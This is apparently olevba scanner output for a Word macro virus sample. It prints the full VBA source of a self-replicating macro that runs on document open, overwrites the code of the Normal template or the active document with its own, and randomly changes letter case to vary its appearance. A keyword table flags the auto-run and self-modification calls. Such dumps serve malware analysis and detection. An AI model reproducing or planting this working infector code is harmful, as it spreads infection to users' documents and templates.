olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Static-e5d0cd3dfca6c39047059f06186508e691cadb16
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Static-e5d0cd3dfca6c39047059f06186508e691cadb16 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub DocuMENT_oPen()
Options.VirusProtection = True 
Options.SaveNormalPrompt = True 
Options.ConfirmConversions = True 
If ThisDocument = NormalTemplate Then Set Target = ActiveDocument Else Set Target = NormalTemplate
Set TarGETmOdUle = Target.VBProject.vBcOMPOneNtS.Item(1).cODEmOduLe
TarGETmOdUle.deLEteliNES 1, TarGETmOdUle.coUntoflINes
TarGETmOdUle.AdDfrOmSTriNG MORPh
If Target = ActiveDocument Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
End Sub
Private Function MORPh()
hOsT = ThisDocument.VBProject.vBcOMPOneNtS.Item(1).cODEmOduLe.LINEs(1, ThisDocument.VBProject.vBcOMPOneNtS.Item(1).cODEmOduLe.coUntoflINes)
For v1 = 1 To Len(hOsT)
v2 = Asc(Mid(hOsT, v1, 1))
If v2 < 90 And v2 > 65 Then
If Int(Rnd * 11) > 5 Then v2 = v2 + 32
ElseIf v2 < 122 And v2 > 97 Then
If Int(Rnd * 11) > 5 Then v2 = v2 - 32
End If
MORPh = MORPh & Chr(v2)
Next
End Function
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |DocuMENT_oPen       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|vBcOMPOneNtS        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|cODEmOduLe          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AdDfrOmSTriNG       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

